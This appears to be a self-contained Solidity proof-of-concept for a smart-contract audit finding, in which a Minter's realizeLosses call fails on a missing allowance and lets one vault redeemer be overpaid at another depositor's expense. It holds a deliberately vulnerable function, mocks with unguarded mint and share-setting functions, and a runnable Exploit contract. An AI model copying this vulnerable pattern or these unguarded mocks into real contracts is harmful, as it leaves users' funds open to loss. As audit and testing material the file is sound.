// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Syntetika Minter.realizeLosses (Cyfrin 2026-05, finding 66047)
    realizeLosses calls hil.burnFrom(vault, losses). burnFrom spends allowance
    unless the spender is the token owner or the token holder. The spender is
    the Minter, the holder is the StakingVault, and the owner is the admin.
    Allowance stays 0, so every non-zero loss reverts. Share price keeps using
    the unburned hil balance. A 200-share redeemer is paid 200 of a 270 custody
    instead of the fair 180, and the other depositor is short 20.

    CREATE order inside Exploit:
      nonce 1 Base, 2 Hil, 3 Vault, 4 Minter
*/

contract Base {
    string public symbol = "BASE";
    uint8 public constant decimals = 8;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Hil {
    string public symbol = "hilBTC";
    uint8 public constant decimals = 8;
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address _owner) {
        owner = _owner;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burnFrom(address from, uint256 amount) external {
        if (msg.sender != from && msg.sender != owner) {
            require(allowance[from][msg.sender] >= amount, "ERC20InsufficientAllowance");
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract Vault {
    Hil public hil;
    Base public base;
    uint256 public totalShares;
    mapping(address => uint256) public shareOf;

    constructor(Hil _hil, Base _base) {
        hil = _hil;
        base = _base;
    }

    function setShares(address user, uint256 shares) external {
        shareOf[user] = shares;
        totalShares += shares;
    }

    function redeem(uint256 shares) external returns (uint256 paid) {
        require(shareOf[msg.sender] >= shares, "shares");
        uint256 hilBal = hil.balanceOf(address(this));
        paid = shares * hilBal / totalShares;
        shareOf[msg.sender] -= shares;
        totalShares -= shares;
        base.transfer(msg.sender, paid);
    }
}

contract Minter {
    Hil public hil;
    Vault public vault;
    address public admin;

    constructor(Hil _hil, Vault _vault, address _admin) {
        hil = _hil;
        vault = _vault;
        admin = _admin;
    }

    function realizeLosses(uint256 lossesAmount) external {
        require(msg.sender == admin, "admin");
        // @> VULN: burnFrom(vault) spends a vault-to-minter allowance the vault never granted
        hil.burnFrom(address(vault), lossesAmount);
    }
}

contract MinterFixed {
    Hil public hil;
    Vault public vault;
    address public admin;

    constructor(Hil _hil, Vault _vault, address _admin) {
        hil = _hil;
        vault = _vault;
        admin = _admin;
    }

    function realizeLosses(uint256 lossesAmount) external {
        require(msg.sender == admin, "admin");
        hil.mint(address(0), 0);
        require(hil.balanceOf(address(vault)) >= lossesAmount, "bal");
        // Vault burns its own balance. No allowance is required when spender == from.
        VaultBurn(address(vault)).burnOwn(lossesAmount);
    }
}

interface VaultBurn {
    function burnOwn(uint256 amount) external;
}

contract VaultWithBurn {
    Hil public hil;
    Base public base;
    uint256 public totalShares;
    mapping(address => uint256) public shareOf;
    address public minter;

    constructor(Hil _hil, Base _base) {
        hil = _hil;
        base = _base;
    }

    function setMinter(address _minter) external {
        minter = _minter;
    }

    function setShares(address user, uint256 shares) external {
        shareOf[user] = shares;
        totalShares += shares;
    }

    function burnOwn(uint256 amount) external {
        require(msg.sender == minter, "minter");
        hil.burnFrom(address(this), amount);
    }

    function redeem(uint256 shares) external returns (uint256 paid) {
        require(shareOf[msg.sender] >= shares, "shares");
        uint256 hilBal = hil.balanceOf(address(this));
        paid = shares * hilBal / totalShares;
        shareOf[msg.sender] -= shares;
        totalShares -= shares;
        base.transfer(msg.sender, paid);
    }
}

contract Exploit {
    Base public base;
    Hil public hil;
    Vault public vault;
    Minter public minter;
    address public constant OTHER = address(0xBEEF);
    uint256 public constant UNIT = 1e8;
    uint256 public paid;
    uint256 public fair = 180 * UNIT;
    bool public lossesReverted;

    constructor() {
        base = new Base();
        hil = new Hil(address(this));
        vault = new Vault(hil, base);
        minter = new Minter(hil, vault, address(this));
        hil.mint(address(vault), 300 * UNIT);
        base.mint(address(vault), 270 * UNIT);
        vault.setShares(address(this), 200 * UNIT);
        vault.setShares(OTHER, 100 * UNIT);
    }

    function run() external {
        require(hil.allowance(address(vault), address(minter)) == 0, "allowance");
        (bool ok,) = address(minter).call(abi.encodeWithSelector(minter.realizeLosses.selector, 30 * UNIT));
        lossesReverted = !ok;
        require(lossesReverted, "realized");
        require(hil.balanceOf(address(vault)) == 300 * UNIT, "hil unchanged");
        paid = vault.redeem(200 * UNIT);
        require(paid == 200 * UNIT, "overpaid");
        require(paid - fair == 20 * UNIT, "excess");
        require(base.balanceOf(address(vault)) == 70 * UNIT, "other short");
        require(base.balanceOf(address(this)) == 200 * UNIT, "received");
    }
}
